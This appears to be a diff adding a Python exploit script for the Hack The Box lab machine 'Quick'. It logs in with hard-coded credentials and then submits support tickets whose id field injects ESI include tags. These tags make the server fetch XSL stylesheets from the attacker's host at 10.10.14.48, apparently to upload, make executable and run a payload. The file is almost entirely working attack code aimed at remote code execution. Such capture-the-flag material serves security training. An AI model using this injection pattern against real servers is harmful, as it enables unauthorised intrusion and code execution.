@@ -1,0 +1,36 @@
+import requests
+import json
+
+### Edit IP in the payload.sh and upload.xsl
+
+IP="10.10.10.186"
+HOSTIP="10.10.14.48"
+# IP="127.0.0.1"
+PORT=9001
+username="elisa@wink.co.uk"
+passw="Quick4cc3$$"
+
+def login(email,password):
+    url = "http://"+IP+":"+str(PORT)+"/login.php"
+    payload={"email":email,"password":password}
+    headers= {"Referer": "http://quick.htb:9001/login.php","Host": "quick.htb:9001"}
+    response = requests.post(url,headers=headers, data=payload,allow_redirects=False)
+    cookie = response.headers['Set-Cookie'] # Return the cookie
+    cookie = cookie.split(";")[0]
+    return cookie
+
+
+def create_ticket(filename,c):
+    c = c.split("=")
+    cookie={c[0]:c[1]}
+    url = "http://"+IP+":"+str(PORT)+"/ticket.php"
+    id="""<esi:include src="http://"""+HOSTIP+"""/"""+filename+""".xml" stylesheet="http://"""+HOSTIP+"""/"""+filename+""".xsl"></esi:include>"""
+    payload = {"title":"test","msg":"test","id":id}
+    response = requests.post(url, data=payload,cookies=cookie,allow_redirects=False)
+
+# title=te&msg=a&id=<esi:include src="http://10.10.14.48/q.xml" stylesheet="http://10.10.14.48/q.xsl"></esi:include>
+
+cookie = login(username,passw)
+create_ticket("upload",cookie)
+create_ticket("chmod",cookie)
+create_ticket("execute",cookie)
